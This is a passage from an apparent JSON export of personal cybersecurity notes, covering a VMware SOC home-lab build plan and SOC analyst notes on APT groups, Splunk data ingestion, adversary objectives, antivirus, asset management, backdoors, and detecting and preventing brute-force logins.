Intelligence Feeds: Enrich alerts with known bad indicators for proactive detection\nActive Response Automation: Automatic threat mitigation (block IPs, quarantine hosts)\nKibana Dashboards + ML: Visualize security events, anomaly detection for unknown threats\n\n\n2. Network &amp; Infrastructure Setup\ngraph TD\n    Internet --&gt; NGFW[Next-Gen Firewall]\n    NGFW --&gt;|Logs &amp; Alerts| Wazuh[Wazuh Server]\n    NGFW --&gt; NetworkTap[Network TAP/SPAN]\n    NetworkTap --&gt; Suricata[Suricata IDS/IPS]\n    NetworkTap --&gt; Zeek[Zeek Network Monitor]\n    Suricata --&gt;|Logs &amp; Alerts| Wazuh\n    Zeek --&gt;|Logs &amp; Alerts| Wazuh\n    ThreatIntel[Threat Intel Feeds] --&gt;|Enrich alerts| Wazuh\n    Wazuh --&gt; Dashboard[SOC Analyst Dashboard]\n    Wazuh --&gt; Automation[Active Response &amp; Automation]\n\n2.1 Network Segmentation\n\n\nInternet → Next-Gen Firewall: Acts as perimeter gatekeeper; blocks unwanted traffic and logs events.\n\n\nNetwork TAP/SPAN: Mirror all network traffic for deep inspection by Suricata &amp; Zeek.\n\n\nSeparate VLANs on VMware:\n\n\nWazuh Server VLAN (central log &amp; alert collection)\n\n\nHost VLANs for agents + IDS tools\n\n\nManagement VLAN for SOC analysts and administration\n\n\n\n\n2.2 VMware Hardware/VMs Setup\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\n\nComponentCPU CoresRAMDiskNotesWazuh Server3 cores6 GB25 GB SSDElasticsearch log retention: 7 daysSuricata + Zeek2 cores3 GB15 GBCombined IDS/NTA VM; limit rules &amp; Zeek logspfSense/OPNsense1 core1 GB8 GBBasic firewall + syslog to WazuhAgent VM 1 (Linux)1 core1 GB10 GBWazuh agent onlyAgent VM 2 (Windows)2 cores|2 GB25 GBWazuh agent only\n\n3. Component Installation &amp; Configuration\n3.1 Next-Gen Firewall (pfSense/OPNsense)\n\n\nWhy: Controls traffic flow, enforces policies, provides perimeter IDS/IPS, and logs network events.\n\n\nInstall pfSense/OPNsense VM on VMware.\n\n\nEnable Suricata or Zeek package if available for integrated IDS/IPS.\n\n\nConfigure firewall rules simulating enterprise policies.\n\n\nSet up secure syslog forwarding (TLS) to Wazuh server for centralized analysis.\n\n\n3.2 Network TAP/SPAN Setup\n\n\nWhy: Allows passive traffic capture without disrupting network flow.\n\n\nUse VMware’s virtual switch port mirroring feature or create a Linux bridge VM as a TAP.\n\n\nMirror all network traffic from host VLANs and firewall to IDS VMs.\n\n\n3.3 Suricata IDS/IPS\n\n\nWhy: Signature-based detection of network threats like malware, exploits, and scans.\n\n\nInstall Suricata on dedicated Linux VM.\n\n\nConfigure it to listen on mirrored network interfaces.\n\n\nRegularly update rule sets (Emerging Threats, ETPro).\n\n\nForward alerts and logs securely to Wazuh server (syslog or Wazuh agent integration).\n\n\n3.4 Zeek Network Monitor\n\n\nWhy: Provides rich network metadata, behavioral anomaly detection, complements Suricata’s signature-based detection.\n\n\nInstall Zeek on separate Linux VM.\n\n\nMonitor mirrored traffic from TAP/SPAN.\n\n\nForward Zeek logs (DNS, HTTP, SSL, etc.) to Wazuh server for correlation.\n\n\n3.5 Wazuh Server\n\n\nWhy: Centralized log management, host intrusion detection, alert correlation, machine learning for anomaly detection, active response platform.\n\n\nInstall Wazuh Manager, Elasticsearch, Kibana, Filebeat on a dedicated VM.\n\n\nConfigure agents on hosts and IDS VMs to send logs.\n\n\nSet up correlation rules combining firewall, host, and network data.\n\n\nEnable ML anomaly detection in Elasticsearch.\n\n\nCreate analyst dashboards in Kibana tailored for different use cases.\n\n\n3.6 Threat Intelligence Feeds\n\n\nWhy: Enrich alerts with context about known malicious IPs, hashes, campaigns for proactive detection.\n\n\nIntegrate open-source feeds like MISP, AlienVault OTX, AbuseIPDB into Wazuh.\n\n\nAutomate feed fetching and alert enrichment.\n\n\n3.7 Active Response &amp; Automation\n\n\nWhy: Reduce SOC workload and response time with automatic mitigations.\n\n\nDevelop playbooks/scripts to:\n\n\nBlock IPs on firewall dynamically via API/CLI\n\n\nQuarantine infected hosts (e.g., disable network interfaces)\n\n\nNotify SOC team via Slack, email, or ticketing systems\n\n\n\n\nTest automation with simulated attacks to ensure effectiveness.\n\n\n\n4. Host Agent Setup\n\n\nInstall Wazuh agents on all host VMs (Windows and Linux).\n\n\nEnable file integrity monitoring, process auditing, log forwarding.\n\n\nSimulate various OS environments to diversify log types and behaviors.\n\n\n\n5. Testing &amp; Validation\n\n\nSimulate attacks such as port scans, brute force login attempts, malware execution, lateral movement.\n\n\nValidate detection across all layers:\n\n\nFirewall logs and alerts\n\n\nSuricata and Zeek network detections\n\n\nWazuh correlation and alerts\n\n\n\n\nTest active response automations triggering correct mitigations.\n\n\n\n6. Monitoring &amp; Maintenance\n\n\nSchedule regular updates for:\n\n\nFirewall rules and firmware\n\n\nIDS signature and Zeek script updates\n\n\nWazuh detection rules and ML models\n\n\nThreat intelligence feeds\n\n\n\n\nMonitor VM performance and storage to avoid bottlenecks.\n\n\nFine-tune detection rules to reduce false positives and improve SOC efficiency.\n\n\n\n7. Documentation &amp; Reporting\n\n\nMaintain detailed documentation of:\n\n\nArchitecture diagrams\n\n\nInstallation and configuration steps\n\n\nOperational procedures and response workflows\n\n\n\n\nGenerate periodic SOC reports via Kibana dashboards for stakeholders.\n\n\nContinuously improve the SOC environment based on lessons learned.\n\n\n\nSummary\nThis detailed plan builds a VMware-hosted SOC home lab prototype replicating a modern enterprise SOC. It covers perimeter defense, host and network monitoring, threat intelligence integration, automated active response, and analyst visibility — foundational for a cybersecurity company prototype and mid-size SOC readiness."},"SOC/HomeLab/Task-List":{"slug":"SOC/HomeLab/Task-List","filePath":"SOC/HomeLab/Task List.md","title":"Task List","links":[],"tags":[],"content":"SOC Home Lab Build - Task List\nPhase 1: Foundation &amp; Infrastructure Setup\n\n 1.1. VMware Environment Setup\n\n Install and configure VMware Workstation Pro.\n\n\n 1.2. Network Segmentation\n\n Create Management VLAN.\n Create Wazuh Server VLAN.\n Create Host &amp; IDS VLANs.\n\n\n 1.3. Next-Gen Firewall (pfSense/OPNsense) Installation &amp; Configuration\n\n Install the firewall VM.\n Assign network interfaces to the correct VLANs.\n Configure initial firewall rules (WAN/LAN, inter-VLAN).\n\n Configure DHCP services for VLANs.\n\n\n\n\n 1.4. Network TAP/SPAN Setup\n\n Configure port mirroring on the VMware virtual switch to send traffic to IDS VMs.\n Verify mirrored traffic is being received on the designated interfaces.\n\n\n\nPhase 2: Core Security Tools Deployment\n\n 2.1. Wazuh Server Installation\n\n Create and prepare the Wazuh Server VM.\n Install Wazuh Manager, Elasticsearch, and Kibana components.\n Perform initial configuration and verify all services are running and accessible.\n\n\n 2.2. IDS Hosts Installation\n\n Create and prepare the Suricata VM (Linux).\n Create and prepare the Zeek VM (Linux).\n\n\n 2.3. Suricata Configuration\n\n Install Suricata on its VM.\n Configure it to listen on the mirrored network interface.\n Download and schedule regular updates for rule sets (e.g., Emerging Threats ETPro).\n\n\n 2.4. Zeek Configuration\n\n Install Zeek on its VM.\n Configure it to monitor the mirrored traffic.\n\n\n\nPhase 3: Endpoint &amp; Log Source Integration\n\n 3.1. Hosts Installation and Wazuh Agents\n\n Create and install a Windows host VM.\n Create and install a Linux host VM.\n Install and configure the Wazuh agent on the Windows host.\n Install and configure the Wazuh agent on the Linux host.\n Verify both agents are connected and reporting to the Wazuh Manager.\n\n\n 3.2. Integrate IDS/Firewall Logs with Wazuh\n\n Install and configure the Wazuh agent on the Suricata host.\n Install and configure the Wazuh agent on the Zeek host.\n Configure the firewall (pfSense/OPNsense) to forward syslog to the Wazuh server.\n Verify that firewall, Suricata, and Zeek logs are appearing in Wazuh/Kibana.\n\n\n 3.3. Threat Intelligence Feed Integration\n\n Choose and configure at least one TI feed (e.g., AlienVault OTX, AbuseIPDB).\n Integrate the feed with Wazuh for alert enrichment.\n\n\n\nPhase 4: Advanced Configuration &amp; Automation\n\n 4.1. Fine-Tune Detections and Visualizations\n\n Create custom correlation rules in Wazuh for multi-source events.\n Build initial analyst dashboards in Kibana for incident triage and threat hunting.\n Enable and configure Wazuh’s Machine Learning features for anomaly detection.\n\n\n 4.2. Develop Active Response &amp; Automation\n\n Firewall Blocking: Write and test a script for Wazuh active response to automatically block a malicious IP on the firewall.\n Host Quarantine: Write and test a script to disable the network interface on a host flagged as compromised.\n Notifications: Set up email or Slack integration for notifications on high-severity alerts.\n\n\n\nPhase 5: Testing, Validation &amp; Documentation\n\n 5.1. Test &amp; Validate the Lab\n\n Run a port scan (e.g., using nmap) and validate detection by the firewall and/or IDS.\n Simulate a brute-force login attempt and validate that detection and active response work as expected.\n Use the EICAR test file to validate malware detection on a host.\n Test a simulated lateral movement attempt between VMs.\n\n\n 5.2. Establish Maintenance &amp; Monitoring\n\n Create a schedule/plan for updating software, rules, and feeds.\n Monitor VM performance and storage to identify bottlenecks.\n\n\n 5.3. Finalize Documentation\n\n Create/update the final network architecture diagram.\n Document key configuration steps and operational procedures.\n Create basic incident response workflow documentation.\n\n\n"},"SOC/HomeLab/The-Process":{"slug":"SOC/HomeLab/The-Process","filePath":"SOC/HomeLab/The Process.md","title":"The Process","links":[],"tags":[],"content":"Phase 1: Foundation &amp; Infrastructure Setup\n\n\n1.1. VMware Environment Setup\nI already have a VMware Workstation Pro  set up.\n\n\n1.2. Network Segmentation\n\nSkip this, we will create lan segment when we install firewall.\n\n\n\n1.3. Next-Gen Firewall (pfSense/OPNsense) Installation &amp; Configuration\n\n\nDownload pfsense: www.pfsense.org/download/. Choose ISO VMware for download.\n\n\nCreate a VM, choose “Typical” &gt; “I will install OS later” &gt; “Other: Free BSD 64bit” &gt; “&lt;name&gt;” &gt; Disk size “8 GB ”, Store as single file.\n\n\nEdit VM settings as follows:\n\nMemory: 1 GB\nProcessor: 1\nCD/DVD: Use iso and add the downloaded iso(extract first).\nNetwork Adapters\n\n\nNetwork Adapter 1: Set the “Network connection” to Bridged. This will be our WAN (internet) connection.\n\n\nClick the Add… button at the bottom. Choose Network Adapter and click Finish.\n\n\nNetwork Adapter 2: Set this to LAN segment and click lan segments button then add a new lan segment and name it SOC_MGMT and click OK. Then select it from dropdown in lan segment.\n\n\nAdd Network Adapter 3: Do the same and add it to new SOC_WAZUH segment.\n\n\nAdd Network Adapter 4: Do the same and add it to new SOC_HOSTS_IDS segment.\n\n\n\n\n\n\nInstall the pfsense OS.\n\nMake sure you added the iso in vm settings and boot up the vm.\nAccept EULA and proceed.\nLAN Segments\n\nFor WAN, choose em0 and proceed with default configs.\nFor LAN, choosse em1 and change the in configs to following:\n\nIP address: 10.10.10.1/24\nDHCP Start: 10.10.10.100\nDHCP End: 10.10.10.200\n\n\n\n\n\nConfirm the changes and everything else should be pretty straightforward.\n\n\n\n\n\n1.4. Network TAP/SPAN Setup\n\nConfigure port mirroring on the VMware virtual switch to send traffic to IDS VMs.\nVerify mirrored traffic is being received on the designated interfaces.\n\n\n\nPhase 2: Core Security Tools Deployment\n\n2.1. Wazuh Server Installation\n\nCreate and prepare the Wazuh Server VM.\nInstall Wazuh Manager, Elasticsearch, and Kibana components.\nPerform initial configuration and verify all services are running and accessible.\n\n\n2.2. IDS Hosts Installation\n\nCreate and prepare the Suricata VM (Linux).\nCreate and prepare the Zeek VM (Linux).\n\n\n2.3. Suricata Configuration\n\nInstall Suricata on its VM.\nConfigure it to listen on the mirrored network interface.\nDownload and schedule regular updates for rule sets (e.g., Emerging Threats ETPro).\n\n\n2.4. Zeek Configuration\n\nInstall Zeek on its VM.\nConfigure it to monitor the mirrored traffic.\n\n\n\nPhase 3: Endpoint &amp; Log Source Integration\n\n3.1. Hosts Installation and Wazuh Agents\n\nCreate and install a Windows host VM.\nCreate and install a Linux host VM.\nInstall and configure the Wazuh agent on the Windows host.\nInstall and configure the Wazuh agent on the Linux host.\nVerify both agents are connected and reporting to the Wazuh Manager.\n\n\n3.2. Integrate IDS/Firewall Logs with Wazuh\n\nInstall and configure the Wazuh agent on the Suricata host.\nInstall and configure the Wazuh agent on the Zeek host.\nConfigure the firewall (pfSense/OPNsense) to forward syslog to the Wazuh server.\nVerify that firewall, Suricata, and Zeek logs are appearing in Wazuh/Kibana.\n\n\n3.3. Threat Intelligence Feed Integration\n\nChoose and configure at least one TI feed (e.g., AlienVault OTX, AbuseIPDB).\nIntegrate the feed with Wazuh for alert enrichment.\n\n\n\nPhase 4: Advanced Configuration &amp; Automation\n\n4.1. Fine-Tune Detections and Visualizations\n\nCreate custom correlation rules in Wazuh for multi-source events.\nBuild initial analyst dashboards in Kibana for incident triage and threat hunting.\nEnable and configure Wazuh’s Machine Learning features for anomaly detection.\n\n\n4.2. Develop Active Response &amp; Automation\n\nFirewall Blocking: Write and test a script for Wazuh active response to automatically block a malicious IP on the firewall.\nHost Quarantine: Write and test a script to disable the network interface on a host flagged as compromised.\nNotifications: Set up email or Slack integration for notifications on high-severity alerts.\n\n\n\nPhase 5: Testing, Validation &amp; Documentation\n\n5.1. Test &amp; Validate the Lab\n\nRun a port scan (e.g., using nmap) and validate detection by the firewall and/or IDS.\nSimulate a brute-force login attempt and validate that detection and active response work as expected.\nUse the EICAR test file to validate malware detection on a host.\nTest a simulated lateral movement attempt between VMs.\n\n\n5.2. Establish Maintenance &amp; Monitoring\n\nCreate a schedule/plan for updating software, rules, and feeds.\nMonitor VM performance and storage to identify bottlenecks.\n\n\n5.3. Finalize Documentation\n\nCreate/update the final network architecture diagram.\nDocument key configuration steps and operational procedures.\nCreate basic incident response workflow documentation.\n\n\n"},"SOC/SOC-Analyst-Notes/APT-Groups":{"slug":"SOC/SOC-Analyst-Notes/APT-Groups","filePath":"SOC/SOC Analyst Notes/APT Groups.md","title":"APT Groups","links":[],"tags":[],"content":"Advanced Persistent Threat (APT) Groups, are the hacker groups that may include many different people and groups that carry out cyber attacks in a targeted and systematic way, with governments support from time to time.\nWithin the MITRE ATT&amp;CK Framework, information about APT groups is collected which helps identify which APT group is targeting which systems and which cyber attack techniques are being implemented. When all this information is gathered together and evaluated with the MITRE ATT&amp;CK matrix, the attack map of the APT group can be revealed.\nGroups: 135\nGroups: attack.mitre.org/groups/ \nExample: Lazarus Group\nThe information about the “Lazarus Group” APT group is as follows:\n\nAs seen in the image above, each APT group listed in the MITRE ATT&amp;CK Framework has a unique Group ID, Name and Description.\nYou can also see the information about the techniques used by the group in cyber attacks at the bottom of the page:\n\nUnder the “Techniques” column, you can see what tools, software or techniques that the APT group was leveraged for the attack. e.g., some software used by the “Lazarus Group” APT group is as in the image below:\n"},"SOC/SOC-Analyst-Notes/Adding-Data-to-Splunk":{"slug":"SOC/SOC-Analyst-Notes/Adding-Data-to-Splunk","filePath":"SOC/SOC Analyst Notes/Adding Data to Splunk.md","title":"Adding Data to Splunk","links":[],"tags":[],"content":"In Splunk, you can add data in different ways. Here we are going to see the forwarder installed on the Win10 computer and with the upload of a log file.\nAdd Data from Forwarder\n\nGo to Settings &gt;Add Data\n\n\n\nSelect “Forward” at the bottom\n\n\n\n\nAdd the computer to the selected host and give it a Server Class Name\n\n\nClick “Next”\n\n\n\n\n\nSelect what you want to monitor, in this case, we want to collect the local event log from this computer.\n\n\nSelect which log you want\n\n\nClick “Next”\n\n\n\n\n\nSelect the index where the logs need to be put.\n\n\nI choose to create a new one named “WinLog_clients”. For this, click on “create a new Index”\n\n\nClick Review to check and then submit.\n\n\nNow, you can click “start searching” to try to find your last connection on the client’s computer.\nCheck Your Indexes\n\nGo to Settings &gt; Indexes\n\n\n\nSearch the index you create previously\n\n\n\nAs you see there is no incoming event, you are going to configure it now.\n\nAdd Receiver\n\n\nGo to Setting &gt; Forwarding and receiving\n\n\nClick to add new receiving\n\n\n\n\n\nAdd the 9997 port (it’s the default one, remember it in the previous document)\n\n\nWait a few minutes and check your indexes again, you will see new values\n\n\n\n\nTry a quick search\n\n\nAdd Data From Uploaded Logs\n\nGo to Settings &gt; Add Data\n\n\n\nSelect “Upload” in the bottom left corner\n\n\n\nPush the file you want to upload, then click “Next”\n\n\n\n\nCheck how Splunk will read your file, then press Next if everything is okay\n\n\nSelect a host field value if needed, and the index which is going to be used (left default in the exercise)\n\n\nContinue to the end, and start searching on it\n\n\n"},"SOC/SOC-Analyst-Notes/Adversary's-Objectives":{"slug":"SOC/SOC-Analyst-Notes/Adversary's-Objectives","filePath":"SOC/SOC Analyst Notes/Adversary's Objectives.md","title":"Adversary's Objectives","links":["SOC/SOC-Analyst-Notes/Unified-Kill-Chain","SOC/SOC-Analyst-Notes/C2"],"tags":[],"content":"The ultimate goal of adversary usually boils down to one pr multiple of the three:\n\nsteal data\ndestroy the organization\nmake an impact\n\nThe Unified Kill Chain describes these motives in three steps:\nCollection\nMITRE Tactic (TA0009)\nAfter all the hunting for access and assets, the adversary will be seeking to gather all the valuable data of interest. This, in turn, compromises the confidentiality of the data and would lead to the next attack stage – Exfiltration. The main target sources include drives, browsers, audio, video and email.\nExfiltration\n(MITRE Tactic TA0010)\nTo elevate their compromise, the adversary would seek to steal data, which would be packaged using encryption measures and compression to avoid any detection. The C2 channel and tunnel deployed in the earlier phases will come in handy during this process.\nImpact\n(MITRE Tactic TA0040)\nIf the adversary seeks to compromise the integrity and availability of the data assets, they would manipulate, interrupt or destroy these assets. The goal would be to disrupt business and operational processes and may involve removing account access, disk wipes, and data encryption such as ransomware, defacement and denial of service (DoS) attacks.\nThe adversary may also wipe out the victim system in this stage to remove any traces of him."},"SOC/SOC-Analyst-Notes/Antivirus-Software":{"slug":"SOC/SOC-Analyst-Notes/Antivirus-Software","filePath":"SOC/SOC Analyst Notes/Antivirus Software.md","title":"Antivirus Software","links":[],"tags":[],"content":"What is Antivirus Software (AV)?\nAntivirus Software (AV) is security software that detects malware on devices and blocks and removes malware from the system before it harms the device.\nTypes of Antivirus Software\nAntivirus software is generally responsible for scanning the system for security. Antivirus software can be divided into subtypes according to scanning methods:\nSignature-Based Scanning\nIn the signature-based scanning method, the antivirus software scans the system to detect malware with a digital signature, and if there is a matching signature, it marks the file it scans and matches as malicious and clears the file from the system. In this method, digital signatures are kept on the system in the database and must be constantly updated with up-to-date malware signatures. It is a method that has been used from the past to the present and is effective in detecting known malware. Although it does not catch every single malware, it can detect most of them.\nHeuristic Scanning\nThe heuristic scanning method is a very different malware detection method than the previous signature-based scanning method. Instead of detecting by signature, it monitors the accesses and behaviors of the examined file. In this way, the probability of detecting malicious activities is much higher. For example, this behavior is flagged as suspicious if the executable file that the antivirus tracks is trying to read or modify a system file it shouldn’t be able to access. Even if its signature is not in the antivirus database as malicious, it may be executable malware. This situation is logged by the antivirus.\nFunctions of Antivirus Software\n\n\nTo detect malware in the system by constantly scanning the system\n\n\nProtecting the system against external threats\n\n\nCleaning detected malware from the system\n\n\nLogic Behind How Antivirus Software Works\nThe working logic of antivirus software is shown as follows:\n\n(Source: www.youtube.com/watch)\nThe Importance of Antivirus Software for Security\nAntivirus software, which has a long history, is of great importance in terms of security. Periodic security scans on systems are one of the most basic security procedures to be performed. Antivirus software is one of the most effective ways to detect known malware and quickly clean it from the system. If an institution does not have antivirus software, it means that security is weak at some point. Using antivirus software with an up-to-date malware signature database is necessary to ensure security today.\nSome popular Antivirus products used in the cybersecurity industry are as follows:\n\n\nMcAfee\n\n\nSymantec\n\n\nBitdefender\n\n\nEset\n\n\nNorton\n\n\nWhat log sources does Antivirus Software have?\nAntivirus software keeps logs of the findings it obtains in its periodic scans or a special scan of a specific file. These logs contain information about the detected malware. For example, information such as the size of the file, the name of the file, its signature, and the type of malware can be included in the logs. Thanks to these logs, information on retrospective scans and malware detections can be obtained.\nIn this part of the training, what Antivirus software is, its types, tasks, working logic, and importance for security were discussed. In the next part of the training, “Sandbox Solutions” will be explained."},"SOC/SOC-Analyst-Notes/Asset-Management-Solutions":{"slug":"SOC/SOC-Analyst-Notes/Asset-Management-Solutions","filePath":"SOC/SOC Analyst Notes/Asset Management Solutions.md","title":"Asset Management Solutions","links":[],"tags":[],"content":"What is Asset Management Solutions?\nAsset Management Solutions is software that can implement all asset management operations such as monitoring the operating status of assets in the corporate network, maintaining them, and removing them when necessary.\nBenefits of Asset Management Software\n\nIt facilitates the implementation of standards.\nIt helps with documentation.\nIt improves the working performance of assets.\nProvides inventory control.\nProvides strategic decision-making support.\n\nTypes and Components of IT Asset Management\nThe four main managed IT assets are:\n\nSoftware\nHardware\nMobile devices\nThe Cloud\n\nThe Importance of Asset Management Software for Security\nToday, there are many devices that act as security products or network products in a corporate network. The increase in the number of devices in the network makes it difficult to manage the devices. Therefore, the things to follow about the devices may cause the details to be overlooked. Asset Management Tools are used to prevent this situation. It is very important that Asset Management tools do their jobs accordingly. Thanks to Asset Management Tools, outdated software can be easily detected and managed. For example, quick action is critical when a security update arrives that patches an important vulnerability in a firewall device. Because as time passes, there may be malicious activities aimed at critical vulnerabilities. Thanks to Asset Management Tools, you can be notified about security updates quickly and updates are made quickly.\nSome popular Asset Management Tools used in the cybersecurity industry are as follows:\n\nAssetExplorer\nIvanti\nArmis\nAsset Panda\n"},"SOC/SOC-Analyst-Notes/Backdoor":{"slug":"SOC/SOC-Analyst-Notes/Backdoor","filePath":"SOC/SOC Analyst Notes/Backdoor.md","title":"Backdoor","links":["SOC/SOC-Analyst-Notes/Pyramid-of-Pain","HTB/Remote-Shells","HTB/Services"],"tags":[],"content":"Maintaining access is important for adversaries, but it is very difficult. The longer a system has been compromised, greater are the risks of detection, and once detected the vulnerabilities will be patched and the cycle of pain continues. To break this cycle, adversaries usually set up a way to still remain in control even after the vulnerability is patched. This is what we call a backdoor, an alternate way in.\nTo achieve this, adversaries modify system settings or applications to receive malicious requests and execute them. There are number of backdoors a adversary can install on a system such as\n\nRemote Shells\nModified Windows Services\n"},"SOC/SOC-Analyst-Notes/Brute-Force-Attack":{"slug":"SOC/SOC-Analyst-Notes/Brute-Force-Attack","filePath":"SOC/SOC Analyst Notes/Brute Force Attack.md","title":"Brute Force Attack","links":["SOC/SOC-Analyst-Notes/Web-Attacks"],"tags":[],"content":"What is Brute Forcing?\nBrute forcing is a type of attack that involves attempting to guess a password or authentication token by systematically trying every possible combination of characters until the correct one is found. In the context of Web Attacks, brute forcing typically refers to the process of using automated tools to repeatedly submit login requests to a web application using different username and password combinations until a valid one is discovered.\nBrute force attacks can be used to gain unauthorized access to a system, steal sensitive information, or launch further attacks against the target or other systems. They can be particularly effective against weak or poorly protected passwords, but can also be very time-consuming and resource-intensive for the attacker, especially if the target system has implemented measures to detect and block brute force attacks.\nBrute force attacks are one of the simplest and most straightforward methods of attacking a web application, and it works by systematically trying every possible combination of usernames and passwords until the correct one is found. This process is typically automated using specialized software or scripts, which can try thousands or even millions of combinations per second.\nThe basic idea behind a brute force attack is to exploit the weak or easily guessable passwords that a lot of people use especially the non-techy users, such as common dictionary words, simple number sequences, or their own names or birthdates. By systematically trying every possible combination of characters, attackers can eventually find the correct password and gain access to the target system.\nBrute Forcing Possible Vectors\nBrute forcing on web applications is a common attack vector used by hackers to gain unauthorized access to user accounts or web servers. In this type of attack, the attacker will use automated tools to submit multiple login requests to the targeted web application using different usernames and passwords, in an attempt to find the correct credentials and gain access to the system.\nWeb applications are particularly vulnerable to brute force attacks because they are often accessible over the internet and rely on user authentication to control access to sensitive data or functionality. If an attacker is able to guess a valid username and password, they can potentially gain access to sensitive user data, such as financial information, personal data, or confidential business information. \nActually, it’s not just guessing usernames and passwords also, directory brute forcing on web applications is another type of brute force attack that involves guessing file or directory names on a web server in order to find hidden or sensitive files or directories. In this type of attack, the attacker will use automated tools to submit requests to the targeted web server using different file or directory names, in an attempt to find files or directories that are not meant to be publicly accessible.\nThis type of attack can be effective against web applications that do not implement proper access controls or that have poorly configured web servers. To prevent directory brute force attacks, web application developers can implement access controls to restrict access to sensitive files and directories, and can configure their web servers to block requests for known sensitive files and directories.\nHow Brute Forcing Works?\nHere’s an example of vulnerable code that is susceptible to Brute Forcing attacks in a PHP script:\n\nThis form is vulnerable to brute force attacks because it allows unlimited login attempts and does not implement any security measures to prevent automated login attempts.\nHere’s an example of how you can use Python requests library to send multiple login requests with a list of usernames and passwords:\n\nImpact of Brute Forcing\nBrute forcing can have significant impacts on a target system or application. Here are some of the potential impacts of brute forcing:\n\n\nDenial of service: Brute forcing can consume a significant amount of computing resources, such as CPU cycles and memory, which can lead to system slowdowns or crashes. This can cause a denial of service (DoS) attack, which makes the target system unavailable to legitimate users.\n\n\nData leakage: Successful brute force attacks can allow unauthorized access to sensitive data, such as login credentials, personal information, financial data, and intellectual property. This can lead to data breaches, which can have severe consequences for the target organization, including financial losses and damage to reputation.\n\n\nAccount takeover: Brute forcing can allow attackers to gain access to user accounts without the owner’s consent. Once an attacker has access to an account, they can carry out malicious activities, such as stealing data, sending spam, or carrying out further attacks.\n\n\nPassword reuse: Brute forcing can reveal weak or easily guessable passwords, which can encourage users to reuse passwords across multiple accounts. This can increase the risk of compromise, as a successful brute force attack on one account can provide access to multiple accounts.\n\n\nLegal and reputational consequences: Brute forcing is illegal and unethical, and can result in significant legal and reputational consequences for individuals and organizations who engage in it. If caught, attackers can face criminal charges, fines, and other penalties. Additionally, organizations who are victims of brute force attacks may suffer reputational damage, loss of trust from customers and stakeholders, and legal liability for failing to protect their systems and data.\n\n\nPrevention Methods for Brute Forcing\nImplement account lockout policies: After a certain number of failed login attempts, lock the user account for a specified period of time, to prevent further login attempts. This will make brute force attacks more difficult, as the attacker will need to wait for the account to become unlocked before attempting more login attempts.\nImplement CAPTCHA: Use CAPTCHA or other bot detection mechanisms to detect automated login attempts and prevent them from succeeding.\nLimit the rate of login attempts: Implement a mechanism that limits the number of login attempts that can be made within a certain time period (e.g. 5 login attempts per minute). This will slow down brute force attacks, as the attacker will need to wait between attempts.\nUse multi-factor authentication: Require users to provide additional authentication factors, such as a one-time code sent via SMS or email, in addition to their username and password.\nMonitoring login attempts: This involves monitoring login attempts for signs of suspicious activity, such as multiple failed login attempts from the same IP address, or unusual spikes in traffic or requests. This can help to detect and prevent brute force attacks before they are successful.\nUsing strong passwords and password policies: This involves requiring users to choose strong passwords that are difficult to guess, and enforcing password policies that require users to change their passwords regularly and prohibiting the use of weak or easily guessable passwords.\nWeb Application Firewalls (WAFs) are commonly used to protect web applications from various types of attacks, including brute force attacks. Here are some ways WAFs can prevent brute force attacks; \nIP blocking: WAFs can block access to the web application from IP addresses that have made excessive login attempts or have triggered other security rules. This can prevent brute force attacks by blocking the attacker’s access to the application altogether.\nUser behavior analysis: WAFs can analyze user behavior patterns to detect abnormal activity, such as a high rate of login attempts or unusual login times. This can help prevent brute force attacks by detecting and blocking suspicious behavior before it becomes a problem.\nIt’s important to note that WAFs are not foolproof and can be bypassed by skilled attackers. Therefore, it’s important to implement multiple layers of security controls, such as strong passwords, account lockout policies, and security awareness trainings for users, in addition to using  WAFs.\nBy implementing these measures, the login form can be more secure, robust, and resistant to brute-force attacks.\nDetecting Brute Forcing Attacks\nIn Part 1, we have described what the Brute Forcing is and how to prevent this attack type. In this part, we’ll have a look at the detection techniques and some tips to make it easier to detect and prevent brute force attacks.\nAnalyzing brute force attacks can help you understand the methods used by attackers and identify vulnerabilities in your security controls. To do this, you should collect and store authentication logs from your web application, including the successful logins as well as the failed login attempts. Look for patterns of suspicious activity in the authentication logs, such as a high number of failed login attempts from a particular IP address or user account. Analyze network traffic logs to identify patterns of traffic that may be associated with brute force attacks, such as repeated login attempts from the same IP address or requests to non-existent pages or directories. \nDeploy an intrusion detection system (IDS) or intrusion prevention system (IPS) to analyze network traffic and detect signs of brute force attacks. Look for common attack vectors used in brute force attacks, such as dictionary attacks or password spraying. Identify user accounts that are vulnerable to brute force attacks due to weak passwords or other vulnerabilities. Finally, monitor for incidents of brute force attacks and respond to them promptly by blocking malicious IP addresses, locking out user accounts, and implementing additional security controls as necessary. By following these steps, you can strengthen your security controls and reduce the risk of successful brute force attacks.\nExample Nginx log file that contains Brute Force attack;\n\nThe log file provided shows the unsuccessful login attempts only. In order to detect the successful login attempts, you would need to analyze the logs further or modify your logging configuration to include the successful login attempts as well.\nSuccessful login attempts would typically result in a response code of 200 or a redirect to a different page, which can be identified in the log file. However, keep in mind that some attackers may attempt to obfuscate their successful login attempts by logging in with valid credentials or using a compromised account, so it is important to perform further analysis to determine if any suspicious activity is occurring.\n\nIn this example, the log entry shows a POST request to the /login.php page with a response code of 302, which indicates a successful login attempt. The Cookie header also includes a PHPSESSID value and a login value, which may be used to track the user session and authentication status. Note that the exact format and contents of the log files can vary depending on the web server and its configuration.\nTo detect brute force attacks in nginx log files, you can use various tools and techniques such as:\nLog analysis tools: There are several log analysis tools such as Logstash, ElasticSearch, and Kibana (ELK Stack) that can help you analyze nginx log files and detect brute force attacks. These tools will allow you to search for specific patterns in the log files, such as repeated failed login attempts from the same IP address or user agent.\nRegular expressions: Regular expressions can be used to search for specific patterns in the log files. For example, you can use a regular expression to match a sequence of repeated failed login attempts from the same IP address or user agent.\nThings that you can do after the detection:\nFail2ban: Fail2ban is a popular intrusion prevention tool that can be used to automatically block the IP addresses that are detected as engaging in brute force attacks. Fail2ban works by monitoring the nginx log files and applying predefined filters to detect and block suspicious activity.\nIP blocking: You can manually block IP addresses that are detected as engaging in brute force attacks by adding them to the nginx configuration file. For example, you can use the deny rule to block traffic from specific IP addresses:\n\nIt’s important to note that detecting brute force attacks is not always a straightforward process and may require additional analysis and investigation to identify the suspicious activity accurately.\nHere’s an example of a regular expression that can be used to detect repeated failed login attempts from the same IP address in an nginx log file:\n/^(\\S+) \\S+ \\S+ [.?] “(POST|GET) /login.php.” (401|403) \\d+ ”.?” ”.?”/gm\nThis regular 